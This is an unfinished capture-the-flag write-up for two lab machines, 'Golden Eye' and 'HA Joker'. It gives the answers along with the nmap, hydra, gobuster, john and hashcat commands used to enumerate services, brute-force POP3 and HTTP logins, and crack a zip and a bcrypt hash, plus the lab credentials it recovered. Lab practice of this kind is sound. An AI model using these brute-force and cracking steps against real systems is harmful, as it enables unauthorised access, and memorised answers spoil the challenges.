## Golden Eye (Not Done)

#### Intro and Enumeration

Use nmap to scan the network for all ports. How many ports are open?
```
nmap -p- -T 4 -v 10.10.108.12

4
```

Who needs to make sure they update their default password?
```
boris
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```
Convert the Decimal code to Characters
```
InvincibleHack3r
```
Other user is called natalya


####  It's mail Time

If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?
```
hydra -l boris -P /usr/share/wordlists/fasttrack.txt 10.10.108.12 -s 55007 pop3 
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 10.10.108.12 -s 55007 pop3 

[55007][pop3] host: 10.10.108.12   login: boris   password: secret1!
[55007][pop3] host: 10.10.108.12   login: natalya   password: bird

```

Log into the pop3 server using the new found credentials of boris
```
telnet 10.10.108.12 55007

user boris
pass secret1! 

list 

retr 1 
retr 2 
retr 3 
```
Other user -> janus

Inspect port 55007, what services is configured to use this port?
```
telnet
```

What can you find on this service?
```
emails
```

What user can break bori's code ? 
```
natalya
```



#### GoldenEye Operators Training

Try using the credentials you found earlier. Which user can you login as?
```
telnet 10.10.108.12 55007
user natalya
pass bird 
list 
retr 2 

username: xenia
password: RCP90rulez!
```

Have a poke around the site. What other user can you find?
```
doak
```

What was this users password?
```
goat
```

## HA Joker CTF (Not Done)

What version of Apache is it?
```
nmap -sV -sC -p 80,8080 10.10.225.38

80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))

| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host: localhost
```

What port on this machine not need to be authenticated by user and password?
```
80
```

There is a file on this port that seems to be secret, what is it?
```
secret.txt
```

There is another file which reveals information of the backend, what is it?
```
phpinfo.php
```

When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?
```
joker
```

What port on this machine need to be authenticated by Basic Authentication Mechanism?
```
8080
```

At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?
```
hydra -l joker P /usr/share/wordlists/rockyou.txt -s 8080 10.10.225.38 http-get

[8080][http-get] host: 10.10.225.38   login: joker   password: hannah
```

Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?
```
gobuster dir -U joker -P hannah --url http://10.10.50.115:8080 --wordlist /usr/share/wordlists/dirb/common.txt 

/administrator (Status: 301)
```

We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?
```
backup.zip
```

We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?
```
zip2john backup.zip > backup.hash
john backup.hash

hannah
```

Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?
```
grep cc1gr_users jooladb.sql | grep user

INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);

admin
```

Super Duper User! What is the password?
```
hashcat -a 0 -m 3200 pass.txt /usr/share/wordlists/rockyou.txt --force 

abcd1234
```

At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?
```

```

This user belongs to a group that differs on your own group, What is this group?
```

```
